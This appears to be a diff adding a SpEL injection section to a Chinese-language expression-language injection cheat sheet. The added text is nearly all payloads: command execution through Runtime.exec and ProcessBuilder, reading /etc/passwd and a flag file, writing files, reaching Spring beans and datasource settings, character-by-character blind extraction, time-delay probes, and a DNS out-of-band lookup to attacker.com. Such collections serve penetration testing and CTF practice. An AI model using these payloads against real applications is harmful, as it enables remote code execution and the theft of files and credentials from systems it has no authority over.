@@ -335,7 +335,76 @@ ${T(java.lang.Runtime).getRuntime().exec(T(java.util.Base64).getDecoder().decode
 | **Spring** | < 5.3.18 (SpEL) | 5.3.18+ |
 | **JSP/EL** | < 3.0.3 | 3.0.3+ |
 
-## 3.4 参考资源
+## 3.4 Spring EL (SpEL) 注入专项
+
+### 3.4.1 检测 Payload
+
+```spel
+// 基础测试
+#{1+1}
+#{'a'=='a'}
+#{T(java.lang.Math).random()}
+
+// 访问类
+#{T(java.lang.String)}
+#{T(java.lang.Runtime)}
+```
+
+### 3.4.2 利用 Payload
+
+```spel
+// 命令执行
+#{T(java.lang.Runtime).getRuntime().exec('id')}
+
+// 进程执行器（更灵活）
+#{new java.lang.ProcessBuilder(new java.lang.String[]{'/bin/sh','-c','id'}).start()}
+
+// 读取文件
+#{T(java.nio.file.Files).readString(T(java.nio.file.Paths).get('/etc/passwd'))}
+
+// 写入文件
+#{T(java.nio.file.Files).write(T(java.nio.file.Paths).get('/tmp/pwned'), 'pwned'.getBytes())}
+
+// 访问 Bean
+#{@beanName.method()}
+#{@dataSource}
+
+// 获取 Servlet 上下文
+#{request}
+#{session}
+#{application}
+#{pageContext}
+
+// 环境信息
+#{environment.getProperty('user.dir')}
+#{environment.getProperty('spring.datasource.url')}
+```
+
+### 3.4.3 盲注数据提取
+
+```spel
+// 逐字符提取
+#{T(java.lang.Character).toString(
+  T(java.nio.file.Files)
+    .readAllLines(T(java.nio.file.Paths).get('/flag.txt'))
+    .get(0)
+    .charAt(0)
+)}
+
+// 条件判断
+#{T(java.nio.file.Files)
+  .readAllLines(T(java.nio.file.Paths).get('/flag.txt'))
+  .get(0)
+  .startsWith('flag{') ? 1/0 : 1}
+
+// 时间延迟盲注
+#{T(java.lang.Thread).currentThread().sleep(5000)}
+
+// DNS 外带
+#{T(java.net.InetAddress).getAllByName('attacker.com')}
+```
+
+## 3.5 参考资源
 
 - [OWASP Expression Language Injection](https://owasp.org/www-community/vulnerabilities/Expression_Language_Injection)
 - [Apache Struts2 Security Advisories](https://cwiki.apache.org/confluence/display/WW/Security+Advisories)
